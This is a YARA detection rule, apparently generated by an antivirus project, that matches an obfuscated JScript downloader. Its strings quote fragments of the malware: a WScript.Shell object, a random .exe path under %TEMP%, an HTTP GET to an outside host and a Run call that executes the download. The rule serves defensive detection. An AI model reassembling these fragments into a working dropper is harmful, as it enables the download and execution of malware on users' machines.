rule sig_20160328_bf0c1eda738f76b94efe67e70b0812e4 {
  meta:
    description = "datamaliciousorder - file 20160328_bf0c1eda738f76b94efe67e70b0812e4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5171a91f8cab271cb90234de2a25e3e8c7cac4b3939e20246aad894390f87dfc"

  strings:
    $s1  = "function Zbnpblgql() {return Ocmdddejp[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"nEy6xnQf2i2eFW9.exe\";};" fullword ascii
    $s2  = "Yyekfsqqk[Zmeptcvm](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "var Ocmdddejp = function Jeceloyigw() {return WScript[Urxewepulb](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Scmdk(Nsuogep, Gvwfq){return Nsuogep - Gvwfq;};" fullword ascii
    $s5  = "do {WScript[Buuzzdb](Vmqmpv() * 11)} while (Yyekfsqqk[\"readystate\"] < 4 );" fullword ascii
    $s6  = "function Enogjyc(Cojjcjodz){Ocmdddejp[\"Run\"](Cojjcjodz, Hpxyd, Hpxyd);};" fullword ascii
    $s7  = "return Scmdk(Pgiowzv, Bemqa);" fullword ascii
    $s8  = "function Uwczsvx() {return ((Myzqoacgp == true) && (Myzqoacgp == Zvihuag)) ? 1 : Hpxyd;};" fullword ascii
    $s9  = "Zvihuag = true; " fullword ascii
    $s10 = "function Ycqcqwxfy(Xjzcri) {var Iiqcieqvt = (1, 2, 3, 4, 5, Xjzcri); return Iiqcieqvt;};" fullword ascii
    $s11 = "var Rvwoqwnpi = false;" fullword ascii
    $s12 = "function Jzaqflb()" fullword ascii
    $s13 = "function Vmqmpv(){return 22;};" fullword ascii
    $s14 = "var Zvihuag = false;" fullword ascii
    $s15 = "var Irukbgptc = new this[\"Date\"]();" fullword ascii
    $s16 = "function Ypliolmxb(){return Urxewepulb;};" fullword ascii
    $s17 = "var Myzqoacgp = false;" fullword ascii
    $s18 = " while (Pglit){" fullword ascii
    $s19 = "function Snalzqxsr(){return Oniivotosi;};" fullword ascii
    $s20 = "Myzqoacgp = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}